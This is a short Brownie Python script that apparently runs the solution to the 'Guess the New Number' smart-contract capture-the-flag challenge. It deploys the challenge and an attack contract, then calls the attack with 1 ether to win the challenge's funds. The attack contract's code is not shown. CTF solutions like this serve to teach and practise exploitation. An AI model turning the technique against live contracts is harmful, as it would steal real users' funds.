from brownie import (
    network,
    accounts,
    config,
    interface,
    chain,
    Contract,
    GuessTheNewNumberChallenge,
    GuessTheNewNumberAttack
)
from scripts.helpful_scripts import (
    get_account,
    get_contract_address,
    check_solution,
    get_web3
)
from web3 import Web3


def main():
    player = get_account()
    challenge_contract = GuessTheNewNumberChallenge.deploy({"from": player, "value": Web3.toWei(1, "ether")})
    attack_contract = GuessTheNewNumberAttack.deploy({"from": player})
    
    tx = attack_contract.attack(challenge_contract, {"from": player, "value": Web3.toWei(1, "ether")})
    tx.wait(1)

    check_solution(challenge_contract.address)